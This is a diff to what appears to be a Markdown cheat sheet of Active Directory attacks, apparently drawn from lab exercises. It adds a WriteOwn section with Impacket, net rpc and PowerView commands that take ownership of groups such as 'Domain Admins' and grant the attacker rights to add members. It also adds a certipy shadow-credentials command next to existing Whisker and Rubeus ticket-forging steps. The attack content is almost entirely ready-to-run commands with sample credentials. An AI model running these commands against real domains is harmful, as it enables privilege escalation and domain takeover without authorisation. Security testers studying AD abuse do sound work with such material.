@@ -9,6 +9,7 @@
   - [GenericAll](#genericall)
   - [Get Changes All](#get-changes-and-get-changes-all)
   - [WriteDacl](#writedacl)
+  - [WriteOwn](#writeown)
 - [ACL attacks](#acl-attacks)
   - [Change password](#change-password)
   - [Targeted Kerberoasting](#targeted-kerberoasting)
@@ -148,6 +149,30 @@ Add-DomainObjectAcl -PrincipalIdentity <CN> -Credential $Cred -RightsGUID <Guid>
 
 Add-DomainObjectAcl -PrincipalIdentity 'kok' -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -Verbose
 Add-ObjectAcl -PrincipalIdentity 'kok' -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -Verbose
+```
+
+## WriteOwn
+you can own the the target object andoObject owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.
+
+#### Linux 
+```bash
+# from Impacket
+owneredit.py -action write -new-owner 'OurUser' -target 'MANAGEMENT' 'domain.local/OurUser':'password' -dc-ip 10.129.146.2
+dacledit.py -action 'write' -rights 'WriteMembers' -principal 'OurUser' -target 'MANAGEMENT' 'domain.local/OurUser':'password' -dc-ip 10.129.146.2
+
+# for example add ourself the ability to add members
+net rpc group addmem "MANAGEMENT" "OurUser" -U "domain.local"/"OurUser"%"password" -S 10.129.146.2
+net rpc group members "MANAGEMENT" -U "domain.local"/"OurUser"%"password" -S 10.129.146.2
+```
+#### Windows
+```powershell
+# powerview 
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain.local\OurUser', $SecPassword)
+Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity OurUser
+
+# for example add ourself the ability to add members
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers
 ```
 
 
@@ -305,9 +330,9 @@ inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_ha
 - needed rights : write the `msDS-KeyCredentialLink` attribute
 
 ### Exploit 
-we have write right over `ZPH-SVRMGMT1$` computer 
 
 #### Windows
+we have write right over `ZPH-SVRMGMT1$` computer 
 ```powershell
 # use Whisker 
 .\Whisker.exe list /target:ZPH-SVRMGMT1$
@@ -320,6 +345,11 @@ Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:<cert> /password:"2hI2TIOeZev
 Rubeus.exe asktgt /user:user-server2$ /certificate:<cert> /password:"ckXTY5LJOKKbG2TN" /domain:first.local /dc:First-DC.first.local /getcredententials /show /ptt /nowrap
 Rubeus.exe s4u /dc:first-dc.first.local /ticket:<ticket> /impersonateuser:admin@first.local /ptt /self /service:host/user-server2.first.local /altservice:cifs/user-server2.first.local
 
+```
+#### Linux 
+we have write over `management_svc` user
+```bash
+certipy-ad shadow auto -username OurUser@local.domain -p password -account management_svc -dc-ip 10.129.146.2 
 ```
 
 ## Resource-based constrained delegation
